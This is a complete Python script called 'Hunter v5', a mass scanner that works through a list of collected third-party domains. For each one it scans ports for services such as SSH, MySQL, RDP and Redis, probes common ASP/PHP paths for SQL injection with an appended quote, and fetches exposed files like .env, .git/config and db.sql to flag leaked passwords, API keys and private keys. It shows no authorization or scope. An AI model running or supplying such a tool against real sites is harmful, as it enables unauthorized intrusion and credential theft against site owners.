#!/usr/bin/env python3
"""Hunter v5 - port discovery + strict vuln detection (no false positives)
Ports = real intel. SQLI/LEAK only flagged on actual error/sensitive content.
"""
import urllib.request, socket, re, time

DOMAINS_FILE = "/opt/msray/collect_domains.txt"
OUT = "/tmp/hunter5_out.txt"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
PORTS = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL",
         3389: "RDP", 6379: "Redis", 8080: "HTTP8080", 8888: "BT", 8443: "HTTPS8443"}
# SQL error signatures (real injection evidence)
SQL_ERRS = [b"Microsoft OLE DB", b"ODBC", b"Unclosed quotation", b"SQL syntax",
            b"mysql_fetch", b"Warning: mysql", b"pg_query", b"ORA-", b"Syntax error",
            b"SQLSTATE", b"sqlsrv", b"DbConnection", b"SQLException", b"Fatal error: Uncaught"]
# Sensitive content signatures
LEAK_KW = [b"DB_PASSWORD", b"DB_USERNAME", b"mysql", b"password", b"passwd",
           b"api_key", b"secret", b"PRIVATE KEY", b"root:", b"BEGIN RSA"]

def fetch(url, timeout=6, data=None):
    try:
        h = dict(UA)
        if data: h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=h)
        return urllib.request.urlopen(req, timeout=timeout).read()
    except Exception as e:
        code = getattr(e, "code", 0)
        if code in (200, 301, 302, 403, 404, 500): return b""
        return b""

def check_port(host, port, timeout=3):
    try:
        s = socket.create_connection((host, port), timeout)
        s.close()
        return True
    except Exception:
        return False

def log(s):
    with open(OUT, "a") as f:
        f.write(s + "\n")

def main():
    domains = []
    try:
        with open(DOMAINS_FILE) as f:
            domains = [l.strip() for l in f if l.strip()]
    except Exception:
        pass
    if not domains:
        domains = ["baidu.com", "qq.com"]
    print("hunter5: %d domains" % len(domains), flush=True)
    for d in domains:
        # resolve
        try:
            ip = socket.gethostbyname(d)
        except Exception:
            continue
        # ports
        openp = [p for p in PORTS if check_port(ip, p)]
        if openp:
            log("[PORTS] %s(%s) | %s" % (d, ip, ",".join("%d(%s)" % (p, PORTS[p]) for p in openp)))
        # web checks
        scheme = "https" if 443 in openp else ("http" if 80 in openp else None)
        if not scheme:
            continue
        base = "%s://%s" % (scheme, d)
        # SQLi probe (strict: only flag real db errors)
        for path in ["/news.asp?id=1", "/?id=1", "/article.asp?id=1", "/show.asp?id=1", "/product.asp?id=1"]:
            try:
                r1 = fetch(base + path)
                r2 = fetch(base + path + "'")
                if r1 and r2:
                    for sig in SQL_ERRS:
                        if sig in r2 and sig not in r1:
                            log("[SQLI] %s%s ERR:%s" % (d, path, sig.decode(errors="ignore")))
                            break
            except Exception:
                pass
        # leak files
        for f in ["/.env", "/.git/config", "/web.config", "/config.php.bak", "/db.sql", "/.svn/entries", "/phpinfo.php", "/info.php"]:
            try:
                r = fetch(base + f)
                if r and len(r) < 500000 and not r.startswith(b"<"):
                    for kw in LEAK_KW:
                        if kw in r:
                            log("[LEAK] %s%s %dB KW:%s" % (d, f, len(r), kw.decode(errors="ignore")))
                            break
                elif r and b"PHP Version" in r[:500]:
                    log("[PHPINFO] %s%s %dB" % (d, f, len(r)))
            except Exception:
                pass
        time.sleep(0.3)
    print("hunter5 done: %d domains" % len(domains), flush=True)

if __name__ == "__main__":
    main()
